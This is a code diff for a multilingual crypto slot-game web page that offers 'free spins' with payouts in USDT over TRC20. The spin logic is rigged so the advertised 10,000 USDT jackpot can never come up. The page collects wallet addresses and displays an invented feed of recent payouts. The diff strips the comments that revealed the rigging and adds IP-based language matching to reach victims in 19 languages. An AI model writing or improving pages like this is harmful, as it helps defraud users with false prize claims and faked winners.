@@ -276,16 +276,12 @@ body{position:fixed;inset:0}
 
 <script>
 // ===== 配置：后端 API 地址 =====
-// 生产环境改成你的后端域名，如 'https://api.yoursite.com'
-// 同域部署保持空字符串即可
 const API_BASE = '';
 
 (function(){
 const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
-// 中奖金额按连中个数固定对应：2×=10, 3×=30, 4×=200, 5×=10000
 const PAYOUT_BY_MATCH = {2:10, 3:30, 4:200, 5:10000};
 const JACKPOT = 10000;
-// 用户点击时，match 只从 [2,3,4] 随机，5 连不出现
 const MATCH_POOL = [2, 3, 4];
 const SYMS=[
 {id:"btc",cls:"sym-btc",label:"BTC",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M20.2 14.3c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.4-.1-.7-.2-1-.2l-2.2-.5-.4 1.7s1.2.3 1.1.3c.6.2.8.5.7.9l-.7 3 .2.1-1.1 4.3c-.1.2-.3.5-.7.4l-1.1-.3-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.8 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.8c2.9.5 5 .3 6-2.3.8-2.1 0-3.3-1.6-4.1 1.2-.3 2-1.1 2.2-2.7zm-3.2 4.5c-.5 2.2-4.1 1-5.3.7l.9-3.8c1.2.3 5 .9 4.4 3.1zm.6-4.5c-.5 2-3.5.97-4.4.73l.9-3.4c1 .2 4.1.7 3.5 2.67z"/></svg>'},
@@ -371,12 +367,10 @@ function fmt(n){return n.toLocaleString("en-US",{minimumFractionDigits:n%1?2:0,m
 function setBal(n){S.bal=n;$("balanceText").textContent=n.toFixed(2)}
 function setLeft(n){S.left=n;$("spinsText").textContent=n}
 
-// 中奖金额按连中个数固定对应：2×=10, 3×=30, 4×=200, 5×=10000
 function calcPayout(match){
   return PAYOUT_BY_MATCH[match] || 0;
 }
 
-// 每次 spin：match 从 [2,3,4] 随机，symbol 也随机，5连不出现
 function outcome(){
   const m = pick(MATCH_POOL);
   const win = pick(SYMS);
@@ -496,9 +490,7 @@ async function submitTrc20Record(address, balance){
   }
 }
 
-// ========== 滚动地址列表：20条队列，滚出一条补一条 ==========
-// 金额 = 该用户 3 次旋转结果之和，单次只可能是 10 / 30 / 200 / 10000
-// 10000 出现概率极低
+// ========== 滚动地址列表 ==========
 function initRollingAddresses() {
   const inner = document.getElementById('rollingInner');
   if (!inner) return;
@@ -570,7 +562,7 @@ function initRollingAddresses() {
 }
 </script>
 
-<!-- ========== 语言切换 ========== -->
+<!-- ========== 语言切换 + IP 自动匹配 ========== -->
 <script>
 (function(){
   const TRANSLATIONS = {
@@ -595,10 +587,56 @@ function initRollingAddresses() {
     pl: { howto_title: 'Jak Grać · Opis', howto_p1: '<span class="highlight-cyan">Obracaj 5 bębnów</span>, aby dopasować symbole krypto. Masz <em>3 darmowe obroty</em> na start — bez depozytu!', howto_p2: 'Dopasuj <em>2+ identyczne symbole</em> na środkowej linii wypłat, aby wygrać. Wygraj do <em>10,000 USDT</em> za 5 takich samych!', howto_p3: 'Po obrotach odbierz wygrane na saldo, następnie <span class="highlight-cyan">wypłać nagrody</span> przez USDT TRC20.', banner_kicker: 'WYGRAJ DO', banner_amt: '10,000 USDT', banner_end: 'ZA DARMO!', banner_sub: 'Obracaj 3 razy, aby odblokować saldo startowe. <em>Bez depozytu!</em>', spin_btn: 'OBRACAJ TERAZ', spins_left: 'POZOSTAŁE DARMOWE OBROTY:', rolling_title: '⛓ OSTATNIE WYPŁATY TRC20' }
   };
 
+  // 国家代码 → 语言映射（19 种语言）
+  const COUNTRY_TO_LANG = {
+    // 英语
+    US:'en', GB:'en', AU:'en', CA:'en', NZ:'en', IE:'en', SG:'en', PH:'en', ZA:'en',
+    // 中文
+    CN:'zh', TW:'zh', HK:'zh', MO:'zh',
+    // 西班牙语
+    ES:'es', MX:'es', AR:'es', CO:'es', CL:'es', PE:'es', VE:'es', EC:'es', GT:'es', CU:'es', BO:'es', DO:'es', HN:'es', PY:'es', SV:'es', NI:'es', CR:'es', PA:'es', UY:'es', PR:'es',
+    // 印地语
+    IN:'hi',
+    // 阿拉伯语
+    SA:'ar', AE:'ar', EG:'ar', DZ:'ar', IQ:'ar', JO:'ar', KW:'ar', LB:'ar', LY:'ar', MA:'ar', OM:'ar', QA:'ar', SD:'ar', SY:'ar', TN:'ar', YE:'ar', BH:'ar',
+    // 葡萄牙语
+    PT:'pt', BR:'pt', AO:'pt', MZ:'pt', CV:'pt', GW:'pt', ST:'pt', TL:'pt',
+    // 俄语
+    RU:'ru', BY:'ru', KZ:'ru', KG:'ru', TJ:'ru', TM:'ru', UZ:'ru', UA:'ru',
+    // 日语
+    JP:'ja',
+    // 德语
+    DE:'de', AT:'de', CH:'de', LI:'de', LU:'de',
+    // 法语
+    FR:'fr', BE:'fr', MC:'fr', SN:'fr', CI:'fr', ML:'fr', BF:'fr', NE:'fr', TG:'fr', BJ:'fr', CM:'fr', MG:'fr', CD:'fr', GA:'fr', GN:'fr', RW:'fr', BI:'fr', DJ:'fr', KM:'fr', HT:'fr', LU:'fr',
+    // 韩语
+    KR:'ko',
+    // 意大利语
+    IT:'it', SM:'it', VA:'it',
+    // 土耳其语
+    TR:'tr', CY:'tr',
+    // 越南语
+    VN:'vi',
+    // 泰语
+    TH:'th',
+    // 印尼语
+    ID:'id',
+    // 马来语
+    MY:'ms', BN:'ms',
+    // 荷兰语
+    NL:'nl', SR:'nl',
+    // 波兰语
+    PL:'pl'
+  };
+
+  const SUPPORTED_LANGS = ['en','zh','es','hi','ar','pt','ru','ja','de','fr','ko','it','tr','vi','th','id','ms','nl','pl'];
+  const STORAGE_KEY = 'nexus_lang';
+
   const langSelect = document.getElementById('langSelect');
   if (!langSelect) return;
 
   function switchLanguage(code) {
+    if (!SUPPORTED_LANGS.includes(code)) code = 'en';
     const trans = TRANSLATIONS[code] || TRANSLATIONS.en;
     const howtoTitle = document.getElementById('howtoTitleText');
     const howtoP1 = document.getElementById('howtoP1');
@@ -628,13 +666,45 @@ function initRollingAddresses() {
     }
     const rollingTitleText = document.getElementById('rollingTitleText');
     if (rollingTitleText) rollingTitleText.textContent = trans.rolling_title;
+    langSelect.value = code;
+    // 阿拉伯语 RTL 支持
+    document.documentElement.dir = (code === 'ar') ? 'rtl' : 'ltr';
   }
 
+  // 手动选择：记住选择
   langSelect.addEventListener('change', function() {
+    localStorage.setItem(STORAGE_KEY, this.value);
     switchLanguage(this.value);
   });
 
+  // 初始化语言
+  function initLanguage() {
+    // 1. 优先使用用户手动选择过的语言
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved && SUPPORTED_LANGS.includes(saved)) {
+      switchLanguage(saved);
+      return;
+    }
+    // 2. 根据 IP 自动匹配
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const country = (data.country_code || '').toUpperCase();
+        const lang = COUNTRY_TO_LANG[country] || 'en';
+        switchLanguage(lang);
+      })
+      .catch(() => {
+        // IP 获取失败时，尝试用浏览器语言
+        const navLang = (navigator.language || 'en').slice(0, 2).toLowerCase();
+        const fallback = SUPPORTED_LANGS.includes(navLang) ? navLang : 'en';
+        switchLanguage(fallback);
+      });
+  }
+
+  // 先用英语渲染，避免空白
   switchLanguage('en');
+  initLanguage();
+
   window.switchLanguage = switchLanguage;
 })();
 </script>
